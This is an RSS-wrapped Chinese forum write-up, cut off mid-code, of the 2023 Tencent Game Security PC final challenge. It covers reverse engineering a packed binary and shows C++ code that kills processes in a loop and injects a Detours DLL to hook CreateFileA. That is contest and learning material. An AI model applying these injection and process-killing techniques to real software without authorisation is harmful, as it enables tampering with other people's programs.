<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>吾爱破解论坛</title>
<link>https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml</link>

<item>
<title>2023腾讯游戏安全PC决赛复现</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141171&amp;idx=1&amp;sn=66f61359150558e0f64a6fce7ef9c39f&amp;chksm=bd50a4678a272d7172260a5fb31c2a3d6d9c91cf41af1c8ac841206025234832867cf73dd42b&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651141171&amp;idx=1&amp;sn=66f61359150558e0f64a6fce7ef9c39f&amp;chksm=bd50a4678a272d7172260a5fb31c2a3d6d9c91cf41af1c8ac841206025234832867cf73dd42b&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
原创 <span>吾爱pojie</span> <span>2024-08-16 10:31</span> <span style="display: inline-block;">北京</span>
</p>

<p>最近一直在做往年腾讯游戏安全PC端的复现，但是2023年决赛的题做到第三问就开始有点做不动了，想在网上找找题解但是并没有找到，于是便想分享一下自己的解题经验和第三问的思路。鉴于知识的局限性，文中可能存在疏漏或不足之处。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://wechat2rss.xlab.app/img-proxy/?k=a5b2ffee&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBmpkibwnI4TfUZuapULbX4uxiaNSYTXf9AtV788N9AsnB3VV0sbaZIZvg%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="line-height: normal; margin-bottom: 0px;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span style="font-size: 24px;">坛账号：Kvancy</span></strong></p><p style="line-height: normal; margin-bottom: 0px;"><br /></p><p>最近一直在做往年腾讯游戏安全PC端的复现，但是2023年决赛的题做到第三问就开始有点做不动了，想在网上找找题解但是并没有找到，于是便想分享一下自己的解题经验和第三问的思路。鉴于知识的局限性，文中可能存在疏漏或不足之处，如果发现任何错误或不准确之处，请不吝赐教。</p><p><img border="0" class="rich_pages wxw-img" height="697" src="https://wechat2rss.xlab.app/img-proxy/?k=d3d4cf76&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBC23BcElicyBAVSGfgwBJAmHr8Ahv8l5TyUQT9lCCcKauR9icHh9Nia1mA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="766" /></p><p><br /></p><p>第一问让我们杀死进程，可以尝试根据windowsAPI提供的TerminateProcess函数去停止进程，写份代码测试下</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">bool</span> <span style="color: rgb(255, 255, 182);">KillProcessByName</span>(<span style="color: rgb(255, 255, 182);">const</span> <span style="color: rgb(255, 255, 182);">char</span>* processName) {<br />    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, <span style="color: rgb(255, 115, 253);">0</span>);    PROCESSENTRY32 pe;    pe.dwSize = sizeof(PROCESSENTRY32);<br />    <span style="color: rgb(150, 203, 254);">if</span> (Process32First(hSnapshot, &amp;pe)) {<br />        <span style="color: rgb(150, 203, 254);">do</span> {<br />            <span style="color: rgb(150, 203, 254);">if</span> (strcmp(pe.szExeFile, processName) == <span style="color: rgb(255, 115, 253);">0</span>) {                HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pe.th32ProcessID);<br />                <span style="color: rgb(150, 203, 254);">if</span> (hProcess) {<br />                    TerminateProcess(hProcess, <span style="color: rgb(255, 115, 253);">0</span>);                    CloseHandle(hProcess);                    Num++;<br />                    printf(<span style="color: rgb(168, 255, 96);">"Kill suc:[%d]\n"</span>, Num);                }            }<br />        } <span style="color: rgb(150, 203, 254);">while</span> (Process32Next(hSnapshot, &amp;pe));    }    CloseHandle(hSnapshot);<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(198, 197, 254);">true</span>;}<br /><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>(){<br />    <span style="color: rgb(150, 203, 254);">while</span>(<span style="color: rgb(255, 115, 253);">1</span>)    {<br />        KillProcessByName(<span style="color: rgb(168, 255, 96);">"WorkingService.exe"</span>);    }<br />    <span style="color: rgb(150, 203, 254);">return</span> <span style="color: rgb(255, 115, 253);">0</span>;<br />}</code></pre><p>以管理员身份启动测试</p><p>启动前：</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=96a5678a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBxbIH5UsVdwSmkCrB0UbdaMUibXmw6qycFa7H6jEyXjaTtgZdagfY4hA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="759" /></p><p><br /><span>启动后</span></p><p><br /></p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=2ff81e63&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBjNGmV1cRQgKIcoybnz6icPTibBd0ia0e4FHR3KvtvBcQOKMgxvHiaxPObw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=1305bb28&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYB9poTP8iaV7pjj3bd04Ux8UTlEsRzDOCegv6e00oWhQicPbDHtJGHBAJg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="904" /><span></span></p><p><br /></p><p>先DIE查壳发现有VMP，只能动调入手，先观察程序功能。程序启动后会有两个进程启动，并且其中之一占用CPU性能较高；程序目录会创建十六个文件，并会做重复的删除和重新创建的操作；观察任务管理器发现进程会自动重启，手动杀死进程后就会重生一个新的进程。</p><p>拖进xdbg里观察符号，发现引入了ShellExcuteA这个函数，正好是启动进程函数，对这个函数下断点，发现确实断了下来，观察传参窗口。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=0556ff24&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYB8kgRPyKfuWV8YDN6HhiaW62icjuOOy4U5IibzZicIlK4K7t9oEIcnWNiauQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="703" /></p><p><br /></p><p>第六个参数不同，对应的是lpParameters（传入进程的参数），一个是<code style="font-family: SFMono-Regular, Consolas, ;">working</code>,一个是<code style="font-family: SFMono-Regular, Consolas, ;">daemon restart</code></p><p>根据这个在控制台上运行加上参数working，发现只有一个工作进程，CPU占用100%，同理加上daemon restart，只有一个守护进程CPU占用不到1%。</p><p>调试参数为working的进程，观察线程发现有16个线程运行同一个函数，刚好对应16个txt日志文件的输出！！！</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=f7cc2a04&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBhjicaeiawkJ3fs8iawPsngT5ia24s9bBJj6IBpmUaBgDxibzIS4WoMzic6tQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="412" /></p><p><br /></p><p>于是进入线程入口开始分析，对所有可能的写入文件的windowsAPI下断，发现都没有断下来，于是向CreateFile等API下断，</p><p>所有线程在CreateFileA上成功断下，观察传参确定这是对日志文件的操作函数</p><p><img border="0" class="rich_pages wxw-img" src="https://wechat2rss.xlab.app/img-proxy/?k=3d834ff3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBo1KqqH0Ccvt96YDJT7MNxm5sB13DLf5P5FwoSibgNmnzDbd1IlEJPPw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="570" /></p><p><br /></p><p>有了这个依据，能确认的就是16个线程会循环通过CreateFileA打开文件，这可能是占用CPU的一个主要因素。但是跟之前运行的结果不同，调试发现，写入文件的API一直没有被调用，而正常运行的结果是，十六个文件会循环的做一个过程，文件被创建-&gt;文件被写入-&gt;文件被删除-&gt;新文件创建…。我通过加working参数运行，只会有一个循环过程，即不会有新文件诞生，文件内容也不会被修改。所以，十六个线程循环CreateFileA打开文件过程是无用功，只会徒增CPU负担！那么我们是不是可以HOOK CreateFileA这个函数，然后每个线程调用它的第二次的时候我们进行线程终止，是不是可以减少CPU的压力了呢？写份代码跑一下看看</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">"pch.h"</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;windows.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;shellapi.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;detours.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">include</span> <span style="color: rgb(168, 255, 96);">&lt;tlhelp32.h&gt;</span></span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">pragma</span> comment(lib,<span style="color: rgb(168, 255, 96);">"detours.lib"</span>)</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> _DEBUG</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">define</span> DBGMGEBOX(fmt, ...) \    do { \         /* 假设最大长度为1024，根据需要调整大小 */ \        wsprintfA(out, fmt, __VA_ARGS__); \<br />        MessageBoxA(NULL, out, <span style="color: rgb(168, 255, 96);">"提示"</span>, MB_OK); \<br />    } while(0)</span><br /><span style="color: rgb(255, 255, 182);">char</span> out[<span style="color: rgb(255, 115, 253);">100</span>];<br />DWORD tlsIndex;<span style="color: rgb(146, 255, 184);">//tls索引</span><br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">BOOL</span>(WINAPI* ShellExecuteExA_t)(SHELLEXECUTEINFOA*);<br /><span style="color: rgb(150, 203, 254);">typedef</span> <span style="color: rgb(255, 255, 182);">HANDLE</span> (WINAPI* CreateFileA_t)(    LPCSTR                lpFileName,    DWORD                 dwDesiredAccess,    DWORD                 dwShareMode,    LPSECURITY_ATTRIBUTES lpSecurityAttributes,    DWORD                 dwCreationDisposition,    DWORD                 dwFlagsAndAttributes,    HANDLE                hTemplateFile);<br />ShellExecuteExA_t TrueShellExecuteExA = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />CreateFileA_t TrueCreateFileA = <span style="color: rgb(198, 197, 254);">NULL</span>;<br />BOOL WINAPI <span style="color: rgb(255, 255, 182);">HookedShellExecuteExA</span>(SHELLEXECUTEINFOA* pExecInfo) {<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">if</span> 1</span><br />    <span style="color: rgb(146, 255, 184);">//执行第一个ShellExecuteExA守护进程</span><br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> Num = <span style="color: rgb(255, 115, 253);">0</span>;<br />    DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"ShellExecuteExA 被调用:Num = %d\nhProcess = %p"</span>, Num, pExecInfo-&gt;hProcess);<br />    <span style="color: rgb(150, 203, 254);">if</span> (Num == <span style="color: rgb(255, 115, 253);">0</span>)    {        Num++;<br />        <span style="color: rgb(150, 203, 254);">return</span> TrueShellExecuteExA(pExecInfo);    }<br />    <span style="color: rgb(150, 203, 254);">else</span>    {<br />        <span style="color: rgb(150, 203, 254);">return</span> TrueShellExecuteExA(pExecInfo);    }<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">else</span></span><br />    <span style="color: rgb(146, 255, 184);">//执行第二个ShellExecuteExA病毒进程</span><br />    <span style="color: rgb(255, 255, 182);">static</span> <span style="color: rgb(255, 255, 182);">int</span> Num = <span style="color: rgb(255, 115, 253);">0</span>;<br />    DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"ShellExecuteExA 被调用:Num = %d \n调用者窗口句柄 = 0x%p\n"</span>, Num, pExecInfo-&gt;hwnd);<br />    <span style="color: rgb(150, 203, 254);">if</span> (Num == <span style="color: rgb(255, 115, 253);">0</span>)    {        Num++;<br />        DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"[2]:当前线程ID：%d"</span>, GetCurrentThreadId());<br />        pExecInfo-&gt;lpFile = <span style="color: rgb(168, 255, 96);">"C:\\Users\\Administrator\\Desktop\\自动F8直到call.txt"</span>;<span style="color: rgb(146, 255, 184);">//修改参数导致重启失败;</span><br />        <span style="color: rgb(150, 203, 254);">return</span> TrueShellExecuteExA(pExecInfo);    }<br />    <span style="color: rgb(150, 203, 254);">else</span>    {<br />        DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"[1]:当前线程ID：%d"</span>, GetCurrentThreadId());<br />        <span style="color: rgb(150, 203, 254);">return</span> TrueShellExecuteExA(pExecInfo);    }<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">endif</span></span>}<br />HANDLE WINAPI <span style="color: rgb(255, 255, 182);">HookCreateFileA</span>(    LPCSTR                lpFileName,    DWORD                 dwDesiredAccess,    DWORD                 dwShareMode,    LPSECURITY_ATTRIBUTES lpSecurityAttributes,    DWORD                 dwCreationDisposition,    DWORD                 dwFlagsAndAttributes,    HANDLE                hTemplateFile){<br />    <span style="color: rgb(146, 255, 184);">//判断线程是否是第一次运行CreateFileA，是的话就放行，不是第一次运行就终止线程</span><br />    <span style="color: rgb(146, 255, 184);">// 获取当前线程的TLS值</span>    LPVOID tlsValue = TlsGetValue(tlsIndex);<br />    <span style="color: rgb(150, 203, 254);">if</span> (tlsValue == <span style="color: rgb(198, 197, 254);">NULL</span>)    {<br />        <span style="color: rgb(146, 255, 184);">// 第一次运行，设置TLS值</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">ifdef</span> _DEBUG</span><br />        DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"放行\nlpFileName:%s\n"</span>, lpFileName);<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">endif</span> </span><br />        TlsSetValue(tlsIndex, (LPVOID)<span style="color: rgb(255, 115, 253);">1</span>);    }<br />    <span style="color: rgb(150, 203, 254);">else</span>    {<br />        <span style="color: rgb(146, 255, 184);">// 不是第一次运行，终止线程</span><br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">ifdef</span> _DEBUG</span><br />        DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"终止\nlpFileName:%s\n"</span>, lpFileName);<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">endif</span> </span><br />        ExitThread(<span style="color: rgb(255, 115, 253);">0</span>);    }<br />    <span style="color: rgb(150, 203, 254);">return</span> CreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);}<br />BOOL APIENTRY <span style="color: rgb(255, 255, 182);">DllMain</span>(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {<br />    <span style="color: rgb(150, 203, 254);">switch</span> (ul_reason_for_call) {<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_ATTACH:        DetourTransactionBegin();        DetourUpdateThread(GetCurrentThread());<br />        <span style="color: rgb(146, 255, 184);">/*TrueShellExecuteExA = (ShellExecuteExA_t)DetourFindFunction("shell32.dll", "ShellExecuteExA");<br />        DetourAttach(&amp;(PVOID&amp;)TrueShellExecuteExA, HookedShellExecuteExA);*/</span><br />        tlsIndex = TlsAlloc();<span style="color: rgb(146, 255, 184);">//初始化TLS</span><br />        TrueCreateFileA = (CreateFileA_t)DetourFindFunction(<span style="color: rgb(168, 255, 96);">"kernelbase.dll"</span>, <span style="color: rgb(168, 255, 96);">"CreateFileA"</span>);        DetourAttach(&amp;(PVOID&amp;)TrueCreateFileA, HookCreateFileA);        DetourTransactionCommit();<br />        <span style="color: rgb(150, 203, 254);">break</span>;<br />    <span style="color: rgb(150, 203, 254);">case</span> DLL_PROCESS_DETACH:        DetourTransactionBegin();        DetourUpdateThread(GetCurrentThread());        DetourDetach(&amp;(PVOID&amp;)TrueShellExecuteExA, HookedShellExecuteExA);        DetourDetach(&amp;(PVOID&amp;)TrueCreateFileA, HookCreateFileA);<br />        TlsFree(tlsIndex);<span style="color: rgb(146, 255, 184);">//清理TLS</span>        DetourTransactionCommit();<br />        <span style="color: rgb(150, 203, 254);">break</span>;    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TRUE;}<br /></code></pre><p>注入进去查看CPU，与不注入的CPU情况对比如图，进程CPU占比显著下降</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=a3503f31&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBQtwOvD3ppBibicxqZRSBnM3tjSQwr1ib1FkIGsOblgbGK9oQXEnNJDmhg%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="815" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=ee1e05ff&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBYyF6cK5vjNN3FNoVOkiccdkldxq5FRGVlDCHo0cPfRiaf29E6ntf3pSA%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="664" /><span></span><br /><span>现在我们能够确定，是这十六个线程循环打开文件（也可能做了其他的事情）占用CPU大量资源。但是直接线程退出的方式也会导致日志文件被删除，题目意思是说</span><span>在保持WorkingService.exe正常运行不崩溃、主体功能无损的前提下，使之占用CPU下降到平均5%以下，WorkingService.exe的主体功能为写入信息。在没有源码的情况下提取这个部分，自行编写一个性能更佳的服务</span><span>，现在直接退出线程的方式会导致日志文件删除过快，虽然写入了信息，但是根本没法看啊，所以我们为了日志文件更方便的浏览，应该在WriteFile之后保存文件。那我们得先hook一下删除文件的函数，看一下在哪调用的，然后选择过滤掉这个函数从而保存日志文件。</span></p><p><br /></p><p>尝试hook一下DeleteFileA这个函数</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=2ce5e0dd&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBjAibWExS7cOSicHXdsYiaCECkJBEBPgd1q65qjDkGicicIxZYAxEibiau0FfQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="755" /></p><p><br /></p><p>发现没有被调用。</p><p>翻阅了下CreateFileA的文档，找到dwFlagsAndAttributes这个参数，发现这个参数包含了<code style="font-family: SFMono-Regular, Consolas, ;">FILE_FLAG_DELETE_ON_CLOSE</code>这个属性，意思是<span style="font-weight: 700;">文件将在关闭所有句柄后立即删除</span></p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">HANDLE <span style="color: rgb(255, 255, 182);">CreateFileA</span>(<br />    LPCSTR lpFileName,    <span style="color: rgb(146, 255, 184);">// 文件名</span><br />    DWORD dwDesiredAccess, <span style="color: rgb(146, 255, 184);">// 访问模式</span><br />    DWORD dwShareMode,     <span style="color: rgb(146, 255, 184);">// 共享模式</span><br />    LPSECURITY_ATTRIBUTES lpSecurityAttributes, <span style="color: rgb(146, 255, 184);">// 安全属性</span><br />    DWORD dwCreationDisposition, <span style="color: rgb(146, 255, 184);">// 创建或打开文件的方式</span><br />    DWORD dwFlagsAndAttributes, <span style="color: rgb(146, 255, 184);">// 文件属性</span><br />    HANDLE hTemplateFile <span style="color: rgb(146, 255, 184);">// 模板文件句柄</span><br />);</code></pre><table width="1628"><thead style="background-color: rgb(217, 226, 223);"><tr style="border-top: 1px solid rgb(198, 203, 209);"><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">FILE_FLAG_DELETE_ON_CLOSE0x04000000</th><th style="text-align: left; padding: 6px 13px; border-top-width: 1px; border-color: rgb(198, 203, 209);">文件将在关闭所有句柄后立即删除，其中包括指定的句柄和任何其他打开或重复的句柄。</th></tr></thead><tbody></tbody></table><p>因此，只要我们改了这个属性，日志文件就不会再被删除，写代码测试下</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">HANDLE WINAPI <span style="color: rgb(255, 255, 182);">HookCreateFileA</span>(    LPCSTR                lpFileName,    DWORD                 dwDesiredAccess,    DWORD                 dwShareMode,    LPSECURITY_ATTRIBUTES lpSecurityAttributes,    DWORD                 dwCreationDisposition,    DWORD                 dwFlagsAndAttributes,    HANDLE                hTemplateFile){<br />    <span style="color: rgb(146, 255, 184);">//缩小每个线程执行CreateFileA的次数，CPU降低到%5以下</span><br />    <span style="color: rgb(146, 255, 184);">// 获取当前线程的TLS值</span>    LPVOID tlsValue = TlsGetValue(tlsIndex);<br />    <span style="color: rgb(150, 203, 254);">if</span> ((DWORD_PTR)tlsValue &lt;= <span style="color: rgb(255, 115, 253);">0x10</span>)    {<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">ifdef</span> _KDEBUG</span><br />        DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"放行\nlpFileName:%s\n"</span>, lpFileName);<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">endif</span> </span>        dwFlagsAndAttributes = FILE_ATTRIBUTE_NORMAL;<br />        TlsSetValue(tlsIndex, (LPVOID)((DWORD_PTR)tlsValue + <span style="color: rgb(255, 115, 253);">1</span>));    }<br />    <span style="color: rgb(150, 203, 254);">else</span>    {<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">ifdef</span> _KDEBUG</span><br />        DBGMGEBOX(<span style="color: rgb(168, 255, 96);">"终止\nlpFileName:%s\n"</span>, lpFileName);<br /><span style="color: rgb(146, 255, 184);">#<span style="color: rgb(150, 203, 254);">endif</span> </span><br />        ExitThread(<span style="color: rgb(255, 115, 253);">0</span>);    }<br />    <span style="color: rgb(150, 203, 254);">return</span> TrueCreateFileA(lpFileName, dwDesiredAccess, dwShareMode, lpSecurityAttributes, dwCreationDisposition, dwFlagsAndAttributes, hTemplateFile);}<br /></code></pre><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=0c270fff&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBqyJ9AxWJK9wiaD2rPs8wbOGr2cbChV86NyCIGY2j7zhbz6qMjbYyx2A%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="1080" /></p><p><br /><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=369df3c9&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBHxNUibkuuRgiaBMJnNIibv18OmMICBUZUp1ialrB9ax0ykUHYd01yzVreQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="967" /><span></span><br /><span>测试得到文件确实没有被删除，并且密文也成功写入文件，CPU占用也少于5%（峰值3%，最后趋近于0）</span></p><p><br /></p><p>到这工作进程已经差不多分析完了，但是别忘了还有一个守护进程，守护进程应该也算是正常功能的一部分，那我们现在要开始结合守护进程分析。根据之前分析得到工作进程启动是通过守护进程调用ShellExcuteExA来传入working参数实现的，而这个后面启动的进程才是我们应该去注入的。而且因为程序有循环自生自灭的一个功能，我们可能要考虑循环注入实现对所有工作进程的hook。首先考虑第一个问题，如何去注入ShellExcuteExA启动的工作进程，第一个方式是Hook ShellExcuteExA这个函数，在其启动前获取ShellExcuteExA返回值-&gt;进程句柄，然后通过进程句柄进行注入；第二个方式是编写一个辅助程序，循环对每一个WorkingService.exe进程进行注入，这个要考虑到hook是否会影响守护进程的正常功能。我想先试一下第二个方式，较为简单一点，先测试一下守护进程是否会调用CreateFileA函数，如果会的话，我们要进行一下过滤操作。Hook测试了下，守护进程先启动，然后是工作进程，但是迟迟没有调试弹窗出现，说明守护进程没有调用CreateFileA。</p><p><img border="0" src="https://wechat2rss.xlab.app/img-proxy/?k=7ee9a0c5&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZJjib3VV3c1licTGIluvLDMYBIx2ZPl9QsOGibVosNicicp0W7HO6Ty2czRS1PTssv2ANBM8ibdEsWL6MibQ%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" width="884" /></p><p><br /></p><p>因此，采用方式二，只要对所有WorkingService.exe进程进行注入，Hook CreateFileA函数即可在正常程序功能执行的情况下，降低CPU能耗，写一个程序测试一下</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(255, 255, 182);">int</span> <span style="color: rgb(255, 255, 182);">main</span>() {<br />    <span style="color: rgb(150, 203, 254);">while</span> (<span style="color: rgb(255, 115, 253);">1</span>)    {<br />        <span style="color: rgb(255, 255, 182);">int</span> Num = <span style="color: rgb(255, 115, 253);">0</span>;<br />        ve  = GetPidByProcName(<span style="color: rgb(168, 255, 